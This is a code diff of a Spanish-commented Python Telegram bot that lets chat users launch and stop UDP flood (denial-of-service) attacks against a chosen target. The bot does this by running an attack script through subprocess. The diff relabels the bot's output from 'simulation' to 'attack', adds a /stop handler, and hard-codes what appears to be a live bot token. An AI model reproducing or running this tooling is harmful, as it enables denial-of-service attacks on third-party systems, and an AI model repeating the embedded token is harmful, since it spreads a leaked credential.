@@ -3,7 +3,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
 # Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "7807495947:AAGvrDQJ0WpnjXLFPhkDsdOB6ql2m7rN0hc"
+TOKEN = "7721099407:AAErYn2rztIngRfxUOTsxMwGrxIO_1u7cqs"
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -26,10 +26,22 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         await update.message.reply_text(
-            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
+            f"Ataque UDP iniciada:\n- Target: {target}\n- Duración: {duration} \n- Threads: {threads}"
         )
     except Exception as e:
         await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
+
+# Comando para detener el ataque
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Construye el comando para detener el ataque
+    command = "python3 start.py stop"
+    
+    # Ejecuta el comando y responde al usuario
+    try:
+        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        await update.message.reply_text("Todos los ataques han sido detenidos.")
+    except Exception as e:
+        await update.message.reply_text(f"Error al detener el ataque:\n{str(e)}")
 
 # Configuración principal del bot
 def main():
@@ -38,6 +50,9 @@ def main():
 
     # Agrega el handler para el comando /udp
     application.add_handler(CommandHandler("udp", udp_attack))
+
+    # Agrega el handler para el comando /stop
+    application.add_handler(CommandHandler("stop", stop_attack))
 
     # Inicia el bot
     application.run_polling()
